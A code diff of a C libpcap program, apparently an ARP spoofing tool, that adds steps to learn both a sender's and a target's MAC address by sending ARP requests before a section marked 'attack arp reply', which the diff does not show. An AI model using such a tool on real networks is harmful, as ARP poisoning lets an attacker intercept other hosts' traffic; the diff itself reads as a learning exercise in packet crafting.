@@ -105,28 +105,24 @@ int main(int argc, char *argv[])
     struct sniff_ethernet *arprequest_eth;
     struct sniff_ethernet *arpreply_eth;
 
-    struct arphdr *arp_to_know_targetmac;
+    struct arphdr *arp_to_know_mac;
     struct sniff_ethernet *ethernet;
 
     u_char *sender_ip=argv[2];
     u_char *target_ip=argv[3];
     u_char sender_ip_data[4];
+    u_char target_ip_data[4];
     inet_pton(AF_INET,sender_ip,sender_ip_data);
+    inet_pton(AF_INET,target_ip,target_ip_data);
 
     arprequest_eth=(struct sniff_ethernet*)send_packet_arprequest;
     arpreply_eth=(struct sniff_ethernet*)send_packet_arpreply;
     arprequest_arp=(struct arphdr*)(send_packet_arprequest+14);
     arpreply_arp=(struct arphdr*)(send_packet_arpreply+14);
 
-    /* arp request to know target mac address*/
-
-    memcpy((*arprequest_eth).ether_shost,my_mac,6);      //my mac
-    memcpy((*arprequest_arp).sha,my_mac,6);             //my mac
-    memcpy((*arprequest_arp).spa,my_ip,4);          	//senderip-my, i have to get my ip information
-    inet_pton(AF_INET,sender_ip,(*arprequest_arp).tpa); //targetip
-
     
     unsigned char sender_mac[6]={0xdd,0xdd,0xdd,0xdd,0xdd,0xdd};
+    unsigned char target_mac[6];
 
         /* Define the device */
         dev = pcap_lookupdev(errbuf);
@@ -156,6 +152,13 @@ int main(int argc, char *argv[])
             return(2);
         }
 
+    /* arp request to know sender mac address*/
+
+    memcpy((*arprequest_eth).ether_shost,my_mac,6);      //my mac
+    memcpy((*arprequest_arp).sha,my_mac,6);             //my mac
+    memcpy((*arprequest_arp).spa,my_ip,4);          	//myip
+    inet_pton(AF_INET,sender_ip,(*arprequest_arp).tpa); //senderip
+
         
       while(success_attack<=10)
       {
@@ -178,20 +181,57 @@ int main(int argc, char *argv[])
 
             if(ntohs((*ethernet).ether_type)==ETHERTYPE_ARP)
             {
-                arp_to_know_targetmac=(struct arphdr*)(packet+14);
-                if(ntohs((*arp_to_know_targetmac).oper)==0x0002)
+                arp_to_know_mac=(struct arphdr*)(packet+14);
+                if(ntohs((*arp_to_know_mac).oper)==0x0002)
                 {
-                    if(!strcmp((*arp_to_know_targetmac).spa,sender_ip_data))
+                    if(!strcmp((*arp_to_know_mac).spa,sender_ip_data))
                     {
-			printf("bug check");
-                        memcpy(sender_mac,(*arp_to_know_targetmac).sha,6);
+                        memcpy(sender_mac,(*arp_to_know_mac).sha,6);
 			success_attack++;
                     }
                 }
+            }          
+      }
+      
+    /* arp request to know target mac address*/
+
+    memcpy((*arprequest_eth).ether_shost,my_mac,6);      //my mac
+    memcpy((*arprequest_arp).sha,my_mac,6);             //my mac
+    memcpy((*arprequest_arp).spa,my_ip,4);          	//myip
+    inet_pton(AF_INET,target_ip,(*arprequest_arp).tpa); //targetip
+
+      success_attack=0;
+      while(success_attack<=10)
+      {
+            printf("sending arp packet to know target mac\n");
+            if(pcap_sendpacket(handle,send_packet_arprequest,42)!=0)
+            {
+                 printf("error\n");
             }
+
+            int res;
+                   /* Grab a packet */
+            res=pcap_next_ex(handle, &header,&packet);
             
+            if(res==0) continue;
+            else if(res==-1) break;
+            else if(res==-2) break;
 
 
+            ethernet=(struct sniff_ethernet*)packet;
+
+            if(ntohs((*ethernet).ether_type)==ETHERTYPE_ARP)
+            {
+                arp_to_know_mac=(struct arphdr*)(packet+14);
+                if(ntohs((*arp_to_know_mac).oper)==0x0002)
+                {
+           	    if(!memcmp((*arp_to_know_mac).spa,target_ip_data,4))
+                    {
+                        memcpy(target_mac,(*arp_to_know_mac).sha,6);
+			success_attack++;
+                    }
+                }
+            }          
       }
 
            /* attack arp reply */
